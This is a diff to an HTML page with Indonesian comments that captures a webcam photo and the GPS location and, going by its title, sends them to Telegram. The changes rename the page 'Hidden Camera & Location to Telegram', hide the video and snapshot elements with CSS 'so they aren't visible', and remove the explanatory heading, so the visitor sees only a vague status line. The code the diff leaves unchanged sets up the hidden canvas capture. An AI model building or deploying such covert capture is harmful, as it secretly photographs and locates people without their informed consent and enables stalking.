@@ -3,13 +3,19 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Auto GPS & Camera to Telegram</title>
+<title>Hidden Camera & Location to Telegram</title>
+<style>
+  /* Sembunyikan video dan foto supaya gak kelihatan */
+  #video, #photo {
+    display: none;
+  }
+</style>
 </head>
 <body>
-<h2>Mengambil Foto dan Lokasi, Kirim ke Telegram</h2>
-<video id="video" width="320" height="240" autoplay muted></video>
-<img id="photo" width="320" height="240" />
 <p id="status">Mengambil data...</p>
+
+<video id="video" autoplay muted playsinline></video>
+<img id="photo" alt="snapshot" />
 
 <script>
 const video = document.getElementById('video');
@@ -67,7 +73,7 @@ async function start() {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
 
-      // Ambil foto dari video
+      // Ambil foto dari video (kamera tersembunyi)
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 320;
       canvas.height = video.videoHeight || 240;
